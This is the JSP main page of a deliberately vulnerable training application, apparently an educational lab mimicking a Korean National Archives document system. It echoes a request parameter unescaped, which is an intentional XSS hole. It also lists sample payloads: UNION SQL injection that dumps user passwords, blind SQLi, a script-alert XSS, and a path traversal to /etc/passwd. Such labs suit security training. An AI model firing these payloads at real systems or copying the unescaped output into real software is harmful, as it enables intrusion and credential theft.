<%@ page contentType="text/html;charset=UTF-8" %>
<!DOCTYPE html>
<html lang="ko">
<head>
  <meta charset="UTF-8">
  <title>국가기록원 - 메인</title>
  <style>
    body { font-family: 'Malgun Gothic', sans-serif; margin: 0; background: #f4f6f9; }
    .header { background: #003366; color: #fff; padding: 16px 30px; display: flex; justify-content: space-between; align-items: center; }
    .header h1 { margin: 0; font-size: 22px; }
    .nav { background: #00509e; padding: 0 30px; }
    .nav a { color: #fff; text-decoration: none; display: inline-block; padding: 12px 18px; font-size: 14px; }
    .nav a:hover { background: #003d7a; }
    .container { max-width: 1000px; margin: 30px auto; padding: 0 20px; }
    .card { background: #fff; border: 1px solid #ddd; border-radius: 6px; padding: 20px; margin-bottom: 20px; }
    .card h2 { color: #003366; border-bottom: 2px solid #003366; padding-bottom: 8px; }
    .menu-grid { display: grid; grid-template-columns: repeat(3,1fr); gap: 16px; margin-top: 20px; }
    .menu-item { background: #fff; border: 1px solid #cce0ff; border-radius: 6px; padding: 20px; text-align: center; text-decoration: none; color: #003366; }
    .menu-item:hover { background: #e8f0fe; }
    .menu-item .icon { font-size: 32px; margin-bottom: 8px; }
    .menu-item .label { font-size: 14px; font-weight: bold; }
    .menu-item .desc { font-size: 12px; color: #666; margin-top: 4px; }
    .footer { background: #003366; color: #aac4e8; text-align: center; padding: 20px; font-size: 12px; margin-top: 40px; }
    .session-info { font-size: 12px; }
  </style>
</head>
<body>
<div class="header">
  <h1>🗄️ 국가기록원 문서관리시스템 (테스트)</h1>
  <div class="session-info">
    <% if (session.getAttribute("loginUser") != null) { %>
      👤 <%= session.getAttribute("loginUser") %> 님
      <a href="/nas/login/logout.do" style="color:#aad4ff;margin-left:10px;">로그아웃</a>
    <% } else { %>
      <a href="/nas/login/login.do" style="color:#aad4ff;">로그인</a>
    <% } %>
  </div>
</div>

<div class="nav">
  <a href="/nas/main/main.do">홈</a>
  <a href="/nas/search/search.do">문서검색</a>
  <a href="/nas/doc/docDetail.do?docId=1">문서상세</a>
  <a href="/nas/board/boardList.do">게시판</a>
  <a href="/nas/board/notice.do">공지사항</a>
  <a href="/nas/file/upload.do">파일관리</a>
  <a href="/nas/user/userInfo.do">사용자조회</a>
  <a href="/nas/h2-console" target="_blank" style="color:#ffcc88;">H2 Console</a>
</div>

<div class="container">
  <div class="card">
    <h2>취약점 테스트 메뉴</h2>
    <p style="color:#555;font-size:13px;">아래 메뉴에서 각 취약점을 테스트할 수 있습니다. 실제 사이트 구조(<code>.do</code> URL)와 동일하게 구성되어 있습니다.</p>

    <% if (request.getParameter("extendedParam") != null) { %>
    <div style="background:#fff3cd;border:1px solid #ffc107;padding:10px;border-radius:4px;margin:10px 0;font-size:13px;">
      📌 extendedParam: <strong><%= request.getParameter("extendedParam") %></strong>
    </div>
    <% } %>

    <div class="menu-grid">
      <a class="menu-item" href="/nas/search/search.do">
        <div class="icon">🔍</div>
        <div class="label">문서 키워드 검색</div>
        <div class="desc">SQLi-1: LIKE 절 문자열 인젝션</div>
      </a>
      <a class="menu-item" href="/nas/doc/docDetail.do?docId=1">
        <div class="icon">📄</div>
        <div class="label">문서 상세 조회</div>
        <div class="desc">SQLi-2: 숫자형 파라미터 인젝션</div>
      </a>
      <a class="menu-item" href="/nas/user/userInfo.do">
        <div class="icon">👤</div>
        <div class="label">사용자 조회</div>
        <div class="desc">SQLi-3: Blind SQLi 테스트</div>
      </a>
      <a class="menu-item" href="/nas/board/boardList.do">
        <div class="icon">📋</div>
        <div class="label">게시판</div>
        <div class="desc">XSS-1/2: Stored XSS</div>
      </a>
      <a class="menu-item" href="/nas/board/notice.do?msg=공지사항%20내용">
        <div class="icon">📢</div>
        <div class="label">공지사항</div>
        <div class="desc">XSS-3: Reflected XSS</div>
      </a>
      <a class="menu-item" href="/nas/file/upload.do">
        <div class="icon">📁</div>
        <div class="label">파일 업로드/다운로드</div>
        <div class="desc">FileUpload + Path Traversal</div>
      </a>
    </div>
  </div>

  <div class="card" style="background:#f8f9ff;border-color:#cce;">
    <h2 style="color:#555;font-size:15px;">💡 빠른 공격 참고</h2>
    <table style="width:100%;font-size:12px;border-collapse:collapse;">
      <tr style="background:#e8eaf6;">
        <th style="padding:8px;text-align:left;border:1px solid #ccc;">취약점</th>
        <th style="padding:8px;text-align:left;border:1px solid #ccc;">URL 예시</th>
      </tr>
      <tr>
        <td style="padding:8px;border:1px solid #eee;">Error-based SQLi</td>
        <td style="padding:8px;border:1px solid #eee;font-family:monospace;">/search/search.do?keyword='</td>
      </tr>
      <tr>
        <td style="padding:8px;border:1px solid #eee;">UNION SQLi</td>
        <td style="padding:8px;border:1px solid #eee;font-family:monospace;">/search/search.do?keyword=' UNION SELECT username,password,role,email,id FROM users--</td>
      </tr>
      <tr>
        <td style="padding:8px;border:1px solid #eee;">숫자형 UNION</td>
        <td style="padding:8px;border:1px solid #eee;font-family:monospace;">/doc/docDetail.do?docId=1 UNION SELECT id,username,password,role,email FROM users</td>
      </tr>
      <tr>
        <td style="padding:8px;border:1px solid #eee;">Blind SQLi</td>
        <td style="padding:8px;border:1px solid #eee;font-family:monospace;">/user/userInfo.do?userId=admin' AND '1'='1</td>
      </tr>
      <tr>
        <td style="padding:8px;border:1px solid #eee;">Reflected XSS</td>
        <td style="padding:8px;border:1px solid #eee;font-family:monospace;">/board/notice.do?msg=&lt;script&gt;alert(1)&lt;/script&gt;</td>
      </tr>
      <tr>
        <td style="padding:8px;border:1px solid #eee;">Path Traversal</td>
        <td style="padding:8px;border:1px solid #eee;font-family:monospace;">/file/view.do?fileName=../../../etc/passwd</td>
      </tr>
    </table>
  </div>
</div>

<div class="footer">
  국가기록원 문서관리시스템 v2.3.1 | 취약점 테스트 전용 환경 | 교육 목적
</div>
</body>
</html>
